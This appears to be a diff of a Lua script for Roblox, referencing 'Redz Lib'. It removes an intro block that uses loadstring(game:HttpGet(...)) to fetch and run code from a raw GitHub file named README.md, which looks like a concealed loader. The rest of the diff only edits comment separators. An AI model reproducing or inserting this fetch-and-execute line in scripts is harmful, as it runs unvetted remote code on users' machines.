@@ -1,11 +1,4 @@
--------------------------------------------
--- Intro
--------------------------------------------
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/psychoSAGAZ/Ngdykhvhhfchh/refs/heads/main/README.md"))()
-end)
-
+-------------------
 -------------------------------------------
 -- Redz Lib
 -------------------------------------------
